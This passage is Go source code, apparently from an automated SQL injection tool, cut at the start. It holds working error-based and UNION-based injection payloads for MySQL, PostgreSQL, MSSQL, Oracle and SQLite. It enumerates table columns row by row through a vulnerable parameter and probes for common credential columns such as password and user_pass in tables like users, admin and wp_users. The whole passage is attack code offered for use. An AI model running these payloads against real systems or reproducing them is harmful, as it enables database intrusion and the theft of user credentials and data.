				fmt.Sprintf("FROM information_schema.columns WHERE table_name='%s' AND table_schema=database()", table))...)
		} else {
			payloads = []string{
				fmt.Sprintf("' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s'),0x7e))-- -", db, table),
				fmt.Sprintf("' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(DISTINCT column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s'),0x7e),1)-- -", db, table),
			}
			payloads = append(payloads, unionVariants("'", "-- -",
				"GROUP_CONCAT(DISTINCT column_name SEPARATOR ',')",
				fmt.Sprintf("FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s'", db, table))...)
		}
		results = en.tryPayloads(payloads, vulnParam, strategies)

	case "PostgreSQL":
		payloads := []string{
			fmt.Sprintf("' AND CAST((SELECT string_agg(DISTINCT column_name, ',') FROM information_schema.columns WHERE table_name='%s') AS INT)=1-- -", table),
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"string_agg(DISTINCT column_name, ',')",
			fmt.Sprintf("FROM information_schema.columns WHERE table_name='%s'", table))...)
		results = en.tryPayloads(payloads, vulnParam, strategies)

	case "MSSQL":
		payloads := []string{
			fmt.Sprintf("' AND 1=CONVERT(int,(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='%s'))-- -", table),
		}
		payloads = append(payloads, unionVariants("'", "-- -",
			"STRING_AGG(column_name,',')",
			fmt.Sprintf("FROM information_schema.columns WHERE table_name='%s'", table))...)
		results = en.tryPayloads(payloads, vulnParam, strategies)

	case "Oracle":
		var payloads []string
		payloads = append(payloads, unionVariants("'", "-- -",
			"LISTAGG(DISTINCT column_name, ',') WITHIN GROUP (ORDER BY 1)",
			fmt.Sprintf("FROM all_tab_columns WHERE table_name='%s'", strings.ToUpper(table)))...)
		payloads = append(payloads, unionVariants("'", "-- -",
			"LISTAGG(DISTINCT column_name, ',') WITHIN GROUP (ORDER BY 1)",
			fmt.Sprintf("FROM user_tab_columns WHERE table_name='%s'", strings.ToUpper(table)))...)
		results = en.tryPayloads(payloads, vulnParam, strategies)

	case "SQLite":
		var payloads []string
		payloads = append(payloads, unionVariants("'", "-- -",
			"GROUP_CONCAT(DISTINCT name)",
			fmt.Sprintf("FROM pragma_table_info('%s')", table))...)
		results = en.tryPayloads(payloads, vulnParam, strategies)
	}

	return results
}

func (en *Enumerator) tryRowByRowColumns(db, table, vulnParam, dbms string, strategies []extractStrategy) []string {
	var columns []string
	maxRows := 50

	switch dbms {
	case "MySQL", "MariaDB":
		var payloadTemplates []string
		if db == "current" {
			payloadTemplates = []string{
				"' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='%s' AND table_schema=database() LIMIT %d,1),0x7e))-- -",
			}
			unionTemplates := unionVariants("'", "-- -",
				"column_name",
				"FROM information_schema.columns WHERE table_name='__TABLE__' AND table_schema=database() LIMIT __OFFSET__,1")
			for _, ut := range unionTemplates {
				t := strings.ReplaceAll(ut, "__TABLE__", "%s")
				payloadTemplates = append(payloadTemplates, strings.ReplaceAll(t, "__OFFSET__", "%d"))
			}
		} else {
			payloadTemplates = []string{
				"' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s' LIMIT %d,1),0x7e))-- -",
			}
			unionTemplates := unionVariants("'", "-- -",
				"column_name",
				"FROM information_schema.columns WHERE table_schema='__DB__' AND table_name='__TABLE__' LIMIT __OFFSET__,1")
			for _, ut := range unionTemplates {
				t := strings.ReplaceAll(ut, "__DB__", "%s")
				t = strings.ReplaceAll(t, "__TABLE__", "%s")
				payloadTemplates = append(payloadTemplates, strings.ReplaceAll(t, "__OFFSET__", "%d"))
			}
		}
		for _, tmpl := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				var payload string
				if db == "current" {
					payload = fmt.Sprintf(tmpl, table, i)
				} else {
					payload = fmt.Sprintf(tmpl, db, table, i)
				}
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(columns, e) {
						columns = append(columns, e)
					}
				}
			}
			if len(columns) > 0 {
				break
			}
		}

	case "PostgreSQL":
		payloadTemplates := []string{
			"' AND CAST((SELECT column_name FROM information_schema.columns WHERE table_name='%s' LIMIT 1 OFFSET %d) AS INT)=1-- -",
		}
		unionTemplates := unionVariants("'", "-- -",
			"column_name",
			"FROM information_schema.columns WHERE table_name='__TABLE__' LIMIT 1 OFFSET __OFFSET__")
		for _, ut := range unionTemplates {
			t := strings.ReplaceAll(ut, "__TABLE__", "%s")
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(t, "__OFFSET__", "%d"))
		}
		for _, tmpl := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(tmpl, table, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(columns, e) {
						columns = append(columns, e)
					}
				}
			}
			if len(columns) > 0 {
				break
			}
		}

	case "MSSQL":
		payloadTemplates := []string{
			"' AND 1=CONVERT(int, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='%s' AND column_name NOT IN (SELECT TOP %d column_name FROM information_schema.columns WHERE table_name='%s')))-- -",
		}
		for _, tmpl := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(tmpl, table, i, table)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(columns, e) {
						columns = append(columns, e)
					}
				}
			}
			if len(columns) > 0 {
				break
			}
		}
		unionTemplates := unionVariants("'", "-- -",
			"column_name",
			fmt.Sprintf("FROM information_schema.columns WHERE table_name='%s' ORDER BY column_name OFFSET __OFFSET__ ROWS FETCH NEXT 1 ROWS ONLY", table))
		for _, ut := range unionTemplates {
			t := strings.ReplaceAll(ut, "__OFFSET__", "%d")
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(t, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(columns, e) {
						columns = append(columns, e)
					}
				}
			}
		}

	case "Oracle":
		var payloadTemplates []string
		unionTemplates := unionVariants("'", "-- -",
			"column_name",
			"FROM (SELECT column_name, ROWNUM r FROM all_tab_columns WHERE table_name='__TABLE__') WHERE r BETWEEN __START__ AND __END__")
		for _, ut := range unionTemplates {
			t := strings.ReplaceAll(ut, "__TABLE__", "%s")
			t = strings.ReplaceAll(t, "__START__", "%d")
			t = strings.ReplaceAll(t, "__END__", "%d")
			payloadTemplates = append(payloadTemplates, t)
		}
		for _, tmpl := range payloadTemplates {
			for i := 1; i < maxRows; i += 5 {
				payload := fmt.Sprintf(tmpl, strings.ToUpper(table), i, i+4)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(columns, e) {
						columns = append(columns, e)
					}
				}
			}
		}

	case "SQLite":
		var payloadTemplates []string
		unionTemplates := unionVariants("'", "-- -",
			"name",
			"FROM pragma_table_info('__TABLE__') LIMIT 1 OFFSET __OFFSET__")
		for _, ut := range unionTemplates {
			t := strings.ReplaceAll(ut, "__TABLE__", "%s")
			payloadTemplates = append(payloadTemplates, strings.ReplaceAll(t, "__OFFSET__", "%d"))
		}
		for _, tmpl := range payloadTemplates {
			for i := 0; i < maxRows; i++ {
				payload := fmt.Sprintf(tmpl, table, i)
				body, _, _, err := en.Engine.Request(payload, vulnParam)
				if err != nil {
					continue
				}
				extracted := en.extractData(body, strategies)
				for _, e := range extracted {
					if e != "" && !contains(columns, e) {
						columns = append(columns, e)
					}
				}
			}
		}
	}

	return columns
}

func (en *Enumerator) tryCommonColumnNames(vulnParam, table, db, dbms string) []string {
	tableColMap := map[string][]string{
		"users":    {"id", "username", "password", "email", "role", "created_at", "updated_at", "last_login", "status", "is_active"},
		"user":     {"id", "username", "password", "email", "role"},
		"admin":    {"id", "username", "password", "email", "level", "permissions"},
		"accounts": {"id", "username", "password", "email", "balance", "created_at"},
		"members":  {"id", "username", "password", "email", "joined_at"},
		"customers": {"id", "name", "email", "phone", "address", "created_at"},
		"clients":  {"id", "name", "email", "phone", "company"},
		"profiles": {"id", "user_id", "bio", "avatar", "website"},
		"config":   {"id", "key", "value", "description"},
		"settings": {"id", "key", "value", "group"},
		"products": {"id", "name", "description", "price", "category", "stock", "image"},
		"orders":   {"id", "user_id", "product_id", "quantity", "total", "status", "created_at"},
		"payments": {"id", "order_id", "amount", "method", "status", "transaction_id"},
		"posts":    {"id", "title", "content", "author", "created_at", "updated_at"},
		"wp_users": {"ID", "user_login", "user_pass", "user_email", "user_registered", "display_name"},
		"flags":    {"id", "flag", "name", "points", "category"},
		"flag":     {"id", "flag", "name", "value"},
	}

	lower := strings.ToLower(table)
	if cols, ok := tableColMap[lower]; ok {
		var found []string
		for _, c := range cols {
			if en.testColumnExists(vulnParam, c, table, db, dbms) {
				found = append(found, c)
			}
		}
		return found
	}

	// Generic fallback
	generic := []string{"id", "name", "value", "key", "type", "status", "created_at", "updated_at"}
	var found []string
	for _, c := range generic {
		if en.testColumnExists(vulnParam, c, table, db, dbms) {
			found = append(found, c)
		}
	}
	return found
}

func (en *Enumerator) testColumnExists(vulnParam, columnName, table, db, dbms string) bool {
	var payload string
	switch dbms {
	case "MySQL", "MariaDB":
		dbref := "database()"
		if db != "" && db != "current" {
			dbref = fmt.Sprintf("'%s'", db)
		}
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=%s AND table_name='%s' AND column_name='%s')>0-- -", dbref, table, columnName)
	case "PostgreSQL":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='%s' AND column_name='%s')>0-- -", table, columnName)
	case "MSSQL":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='%s' AND column_name='%s')>0-- -", table, columnName)
	case "SQLite":
		payload = fmt.Sprintf("' AND (SELECT COUNT(*) FROM pragma_table_info('%s') WHERE name='%s')>0-- -", table, columnName)
	default:
		return false
	}
	body, _, _, err := en.Engine.Request(payload, vulnParam)
	if err != nil {
		return false
	}
	return strings.Contains(body, "1") || strings.Contains(body, ">0")
}

func extractBetween(s, start, end string) string {
	startIdx := strings.Index(s, start)
	if startIdx == -1 {
		return ""
	}
	startIdx += len(start)
	endIdx := strings.Index(s[startIdx:], end)
	if endIdx == -1 {
		return ""
	}
	return s[startIdx : startIdx+endIdx]
}

func contains(slice []string, s string) bool {
	for _, item := range slice {
		if item == s {
			return true
		}
	}
	return false
}

func splitStr(s, strList string) bool {
	for _, item := range strings.Split(strList, "|") {
		if strings.EqualFold(s, item) {
			return true
		}
	}
	return false
}
